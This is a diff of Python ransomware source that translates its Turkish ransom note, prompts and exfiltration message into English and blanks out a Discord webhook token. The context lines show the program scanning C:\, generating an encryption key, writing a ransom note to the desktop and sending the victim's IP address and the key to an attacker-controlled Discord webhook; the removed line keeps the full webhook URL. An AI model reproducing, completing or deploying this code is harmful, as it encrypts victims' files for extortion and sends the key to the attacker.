@@ -78,7 +78,7 @@ def create_files():
     readme_file_path = os.path.join(desktop_path, "benioku.txt")
     try:
         with open(readme_file_path, "w") as readme_file:
-            readme_file.write("Dosyalarınız şifrelendi.\nŞifreyi çözmek için talimatları izleyin...")
+            readme_file.write("Your files have been encrypted.\nFollow the instructions to decrypt...")
     except Exception:
         pass
 
@@ -110,7 +110,7 @@ def decrypt_file(file_path, key, output_directory):
 def decrypt_all_files(directory, key, output_directory):
     for root, dirs, files in os.walk(directory):
         for file in files:
-            if file.endswith(tuple(ENCRYPTED_EXTENSIONS)) and file not in ["ransom_x.py", "ransom_y.py", "benioku.txt"]:
+            if file.endswith(tuple(ENCRYPTED_EXTENSIONS)) and file not in ["ransom_x.py", "ransom_y.py", "readme.txt"]:
                 file_path = os.path.join(root, file)
                 decrypt_file(file_path, key, output_directory)
 
@@ -121,7 +121,7 @@ def get_valid_key():
             key = key_b64.encode()
             return key
         except ValueError:
-            print("Tekrar deneyin.")
+            print("Please try again.")
 
 if __name__ == "__main__":
     key = get_valid_key()
@@ -136,11 +136,11 @@ def main():
     file_list = get_all_files("C:\\")
     key = Fernet.generate_key()
     key_content = key.decode()
-    webhook_url = "https://discord.com/api/webhooks/1277985827409887284/hwgu1bb-lbydDJGuEaatEaOkXX8e2lavR_vgnzJsZmkL1RL7d73CPJgdkrBQ-lbcmSFs"
+    webhook_url = "https://discord.com/api/webhooks/"
 
     create_files()
 
-    webhook_message = f"IP Adresi: {globals()[ip_address_var]}\nAnahtar: {key_content}"
+    webhook_message = f"IP Address: {globals()[ip_address_var]}\nKey: {key_content}"
     thread = threading.Thread(target=webhook_thread, args=(webhook_url, webhook_message))
     thread.start()
 
